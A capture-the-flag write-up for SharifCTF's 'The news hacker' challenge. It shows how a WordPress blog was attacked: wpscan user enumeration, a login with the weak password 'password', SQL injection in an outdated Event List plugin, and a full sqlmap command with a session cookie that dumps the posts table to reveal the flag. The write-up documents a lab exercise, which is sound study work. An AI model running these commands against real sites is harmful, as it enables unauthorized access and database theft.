The news hacker
===============

## Task description
Only admin can see the flag :)
Hint: Weak password!


## Initial analysis
The site under the url provided in the challenge is a news blog.

![](https://i.imgur.com/5rFFoiW.png)

Inspecting the source, we find out that the site is powered by Wordpress.

![](https://i.imgur.com/YmfvcXJ.png)

Indeed, after trying to access `/wp-admin/`, we are redirected to the Wordpress login page.

![](https://i.imgur.com/WMrJj6z.png)

## Bypassing authentication
The hint in the challenge description mentions a weak password, but sadly attemping to bruteforce the `admin` account yields no results. After checking the wordpress version and all of its plugins, several vulnerabilities are found, but all of them require to be authenticated.

Perhaps there is another user that we could authenticate as? Let's fire up `wpscan` and find out. The wpscan command to enumerate users is `wpscan --url http://8082.ctf.certcc.ir/ --enumerate u`. This gets us the following results.

![](https://i.imgur.com/NGtaHx1.png)

We found another user besides admin: `organizer`. After trying to log in with the most obvious password: `password`, we are successfully logged in.

![](https://i.imgur.com/HKqseL8.png)

## Exploiting outdated plugins
After logging in and probing around, nothing of interest can be found in the admin panel. It looks like our user doesn't have access to anything worth using. However, we are now authenticated, so it should be possible to exploit one of the vulnerabilities in the outdated plugins. 

After trying a few of them out, only one seems to be working. It's in the Event List Plugin version 0.7.8: [exploit-db description](https://www.exploit-db.com/exploits/42173/).

The `http://8082.ctf.certcc.ir/wp-admin/admin.php?page=el_admin_main&action=edit&id=1` gets us the event page.

![](https://i.imgur.com/KMw0cCy.png)

But `http://8082.ctf.certcc.ir/wp-admin/admin.php?page=el_admin_main&action=edit&id=1 AND 1=2` does not.

![](https://i.imgur.com/g4uPToF.png)

## SQL Injection
We have a confirmed SQL injection vulnerability, so let's sqlmap do the rest of the work. We are able to get the password hash for the `admin` user from the database, but attemps at cracking it don't yield any results. However, after looking at the wordpress posts table, the flag can be found in one of the posts.

The sqlmap command to retrieve the posts table is as follows (the cookie is taken from the browser):

```
sqlmap -u "http://8082.ctf.certcc.ir/wp-admin/admin.php?page=el_admin_main&action=edit&id=1" -p id --cookie="wordpress_eb2a34d2fb7f6ae7debb807cd7821561=organizer%7C1518169483%7Cm59DKLrouqZJTsIQAa9RKgsYDQqLzyrUB854ah0ddKi%7Cdc6d61fcc29fe8bd1a6c334dbf2bbf6ea3e9e5683eed4d095883e8b650d2bf82" -D wp_blog -T wp_posts --columns --dump
```

After inspecting the resulting csv table dump, a following line is found:

```
25,http://10.0.3.189/?p=25,<blank>,<blank>,2018-01-08 04:14:21,post,flag,0,Flag,private,0,open,1,Flag is SharifCTF{e7134abea7438e937b87608eab0d979c},<blank>,2018-01-08 04:14:21,2018-01-08 10:58:41,0,<blank>,<blank>,open,2018-01-08 10:58:41,<blank>
```

The line contains the flag: `SharifCTF{e7134abea7438e937b87608eab0d979c}`.

